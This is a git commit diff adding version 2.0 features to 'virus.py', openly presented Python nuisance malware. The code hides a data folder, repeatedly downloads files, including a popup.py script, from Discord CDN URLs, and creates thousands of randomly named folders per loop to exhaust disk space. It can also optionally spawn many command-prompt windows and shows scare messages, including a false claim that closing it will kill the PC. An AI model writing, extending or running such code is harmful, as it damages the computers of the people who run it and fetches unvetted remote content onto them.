056c802781659e84ab9c28286b7bacd68146f7cb
DEV-S4M <128088351+DEV-S4M@users.noreply.github.com>
2023-03-26 19:16:26 -0400

    Update virus.py
    2.0
    - Added config
    -- Ghostface toggle
    -- Scary Spam toggle
    -- Individual load toggle
    -- Spam command prompt toggle
    
    - Now spams a shit ton of folders, to be specific 100,000 per second

--- virus.py
+++ virus.py
@@ -1,3 +1,25 @@
+import sys
+import threading
+import pystyle
+from pystyle import Colorate, Colors
+import os
+import requests
+import json
+import time
+from time import sleep
+import random
+from random import randint
+import ctypes
+from threading import Thread
+
+############################################
+#               CONFIG                     #
+############################################
+scaryspam = False
+spamcmd = False
+individualload = False
+showghostface = False
+
 def install(package):
     os.system(f"{sys.executable} -m pip install {package}")
 
@@ -12,11 +34,6 @@ except ModuleNotFoundError:
     install("pystyle")
 
 try:
-    import colorama
-except ModuleNotFoundError:
-    install("colorama")
-
-try:
     import json
 except ModuleNotFoundError:
     install("json")
@@ -26,28 +43,61 @@ try:
 except ModuleNotFoundError:
     install("json")
 
-import sys
-import pystyle
-from pystyle import Colorate, Colors
-import colorama
-from colorama import Fore
-colorama.init()
-import os
-import requests
-import json
-import time
-from time import sleep
-import random
-from random import randint
+try:
+    import playsound
+except ModuleNotFoundError:
+    install("playsound")
 
+try:
+    import tkinter as tk
+except ModuleNotFoundError:
+    install("tk")
 
+from playsound import playsound
 
 cmd = 'mode 50,50'
 os.system(cmd)
+os.system("title Loading...")
 
-print(Colorate.Horizontal(Colors.green_to_black,"$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\n$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\n\n", 1))
-print("")
+ghostface = """
 
+⠀⠈⠀⠀⠳⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+⣄⣤⣶⣶⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⠋⠁⠀⠀⠈⠻⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⣦⣤⡀⠀⠀⠀⠀⠀⢠⣿⣿⣿⡏⠀⠊⠀⠀⠀⠀⠸⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⢀⣾⣿⣟⠥⢖⣧⣾⣿⠀⣀⣤⠀⠘⠿⣿⣿
+⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⣼⣿⡟⢡⣾⣿⣿⡿⠃⠀⢸⣿⣇⠀⢸⣿⣿
+⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⣰⣿⣿⡗⠈⠙⠛⡉⠔⠁⠀⢸⣿⣿⣆⠈⣿⣿
+⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⢰⣿⣿⣿⣿⣷⠀⠁⠴⠾⣿⡄⠀⠛⠿⠿⠂⢸⣿
+⠿⣿⠻⠿⠿⣿⠆⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⠀⠀⣀⣀⠀⠀⠀⠢⢀⣀⣠⣾⣿
+⠀⠸⠀⠀⢀⠆⠀⠀⠀⠀⠀⢘⣿⣿⣿⣿⣟⣌⣾⣿⣿⣿⡄⠀⠀⢠⣾⣿⣿⣿
+⣀⡀⠀⠀⠈⠀⠀⠀⠀⢀⣰⣿⣿⣿⣿⣿⣿⢸⣿⣿⣿⣿⠃⠀⢀⣿⣿⣿⣿⣿
+⣿⣧⠀⠀⠀⣿⣶⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣸⣿⣿⣿⠏⣠⣴⣿⣿⣿⣿⣿⣿
+⣿⣿⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⣿⣿⣿⡏⣼⣿⣿⣿⣿⣿⣿⣿⣿
+⣿⣿⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⣿⣿⡟⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿
+⣿⣿⣇⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⠻⢟⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+⣿⣿⣿⣆⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+
+
+
+"""
+if showghostface:
+    print("")
+    print(Colorate.Diagonal(Colors.rainbow,ghostface, 1))
+    print("")
+    print(Colorate.Diagonal(Colors.red_to_white,"What's your favorite scary movie?", 1))
+    time.sleep(1)
+    os.system("cls")
+else:
+    pass
+
+print(Colorate.Diagonal(Colors.red_to_white,"This tool was made by:", 1))
+print(Colorate.Diagonal(Colors.red_to_white,"GitHub: DEV-S4M", 1))
+print(Colorate.Diagonal(Colors.red_to_white,"Discord: sam.#9999", 1))
+time.sleep(1.5)
+os.system("cls")
+
+
+print(Colorate.Horizontal(Colors.rainbow,"$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\n$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\n\n", 1))
 print(Colorate.Horizontal(Colors.green_to_white,"Welcome to the program, You MUST wait...\n\n", 1))
 time.sleep(1)
 print(Colorate.Horizontal(Colors.green_to_white,"The program will now load...\n\n", 1))
@@ -55,20 +105,66 @@ print("")
 print(Colorate.Horizontal(Colors.red_to_yellow,"Note: Closing this will kill your PC...\n\n", 1))
 print("")
 print(Colorate.Horizontal(Colors.blue_to_purple,"Downloading all files...\n\n", 1))
+time.sleep(2)
+os.system("cls")
+
+if scaryspam:
+    def scary_spam():
+        print(Colorate.Horizontal(Colors.blue_to_purple,"Did you hear that??? They're coming...\n\n", 1))
+        time.sleep(0.1)
+    count = 0
+    while (count < 30):
+        count = count + 1
+        scary_spam()
+    os.system("cls")
+else:
+    pass
 
 def download_files():
+    time.sleep(1)
     os.system(f"title {random.randint(1, 100000)} - Made by DEV_S4M on GitHub")
     if not os.path.exists('./data/'): os.makedirs('./data/')
+    FILE_ATTRIBUTE_HIDDEN = 0x02
+    ret = ctypes.windll.kernel32.SetFileAttributesW("./data/", FILE_ATTRIBUTE_HIDDEN)
+    if not os.path.isfile(f'./data/popup.py'): open(f'./data/popup.py', 'wb').write(requests.get('https://cdn.discordapp.com/attachments/1068625802465386496/1089654576208154664/popup.py', allow_redirects=True).content)
     if not os.path.isfile(f'./data/notavirus-{random.randint(1, 10000000)}'): open(f'./data/notavirus-{random.randint(1, 10000000)}', 'wb').write(requests.get('https://cdn.discordapp.com/attachments/1066222613812232233/1089270717847191552/1.txt', allow_redirects=True).content)
-    print("")
-    print(Colorate.Horizontal(Colors.green_to_white,f"Downloaded notavirus-{random.randint(1, 100000)} successfully!\n\n", 1))
-    print(Colorate.Horizontal(Colors.red_to_yellow,"- Note: Closing this will kill your PC...\n\n", 1))
+    if not os.path.exists('./data/sounds'): os.makedirs('./data/sounds')
+    time.sleep(1)
 
+    print("")
+    if individualload:
+        print(Colorate.Horizontal(Colors.green_to_white,f"Downloaded notavirus-{random.randint(1, 100000)} successfully!\n\n", 1))
+        print(Colorate.Horizontal(Colors.red_to_yellow,"- Note: Closing this will kill your PC...\n\n", 1))
+    else:
+        print(Colorate.Horizontal(Colors.green_to_white,f"Downloading Files...\n\n", 1))
+
+
+def ear_rape():
+    playsound('./data/sounds/lol.mp3')
+
+def make_folders():
+    count = 0
+    while (count < 10000):
+        count = count + 1
+        if not os.path.exists(f'./data/fucked-{random.randint(1, 10000000000000000000000000)}'): os.makedirs(f'./data/fucked-{random.randint(1, 10000000000000000000000000)}')
+
+def popup():
+    ctypes.windll.user32.MessageBoxW(0, "That's an error", "Warning!", 16)
+
+def open_cmd():
+    count = 0
+    while (count < 10):
+        count = count + 1
+        os.system("start cmd")
 
 count = 0
 while (count < 10000):
     count = count + 1
     download_files()
-
+    make_folders()
+    if spamcmd:
+        open_cmd()
+    else:
+        pass
 
 input(Colorate.Horizontal(Colors.red_to_yellow,"\nIf you made it here, you have a lot of storage... Press enter to close.", 1))
